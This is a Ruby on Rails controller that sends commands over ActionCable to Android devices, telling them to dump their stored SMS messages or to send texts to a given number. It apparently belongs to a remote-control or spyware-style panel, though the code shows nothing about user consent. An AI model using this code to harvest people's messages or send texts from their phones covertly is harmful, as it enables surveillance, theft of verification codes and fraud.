class SmsMessagesController < InheritedResources::Base
  def dump_messages
    begin
      smartphone_id = params[:smartphone_id]
      @smartphone = Smartphone.find(smartphone_id)
      
      # Send command via ActionCable to Android app
      command_data = {
        command: "get_sms",
        timestamp: Time.now.to_i
      }
      
      ActionCable.server.broadcast(
        "command_channel_#{@smartphone.device_id}",
        command_data
      )
      
      commandOutput = ["Command sent to device #{@smartphone.device_id}", "SMS dump requested..."]
      @fileName = "sms_dump_#{Time.now.to_i}.txt"
    rescue => e
      puts "Error on dump messages: #{e.message}"
      commandOutput = ["Operation Failed: #{e.message}"]
      @fileName = "error.txt"
    end
    respond_to do |format|
      format.js {
        render "dump_messages",
               :locals => { :commandOutput => commandOutput,
                            :fileName => @fileName }
      }
    end
  end

  def send_sms
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      phone_number = params[:phone_number] || '0729380759'
      message_text = params[:message] || 'Test message'
      
      pending_command = send_command_and_wait(
        @smartphone, 
        'send_sms', 
        { phone_number: phone_number, message: message_text }, 
        timeout: 15.seconds
      )
      
      if pending_command.completed?
        commandOutput = ["SMS sent successfully to #{phone_number}"]
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error sending SMS: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "send_message", locals: { commandOutput: commandOutput }
      }
    end
  end

  private

  def sms_message_params
    params.require(:sms_message).permit(:date,
                                        :filename,
                                        :smartphone_id)
  end
end
